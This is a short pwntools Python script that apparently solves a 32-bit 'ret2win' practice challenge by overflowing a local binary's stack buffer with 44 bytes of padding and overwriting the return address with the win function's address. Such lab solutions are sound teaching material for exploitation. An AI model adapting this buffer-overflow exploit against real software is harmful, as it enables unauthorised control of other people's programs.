from pwn import *

context.log_level = 'debug'       
context.binary = exe = ELF('./ret2win32', checksec=False)

p = process(exe.path)             
offset = 44                       
ret2win = exe.sym.ret2win        
payload = b'A' * offset           
payload += p32(ret2win)          

p.sendline(payload)              
p.interactive()    
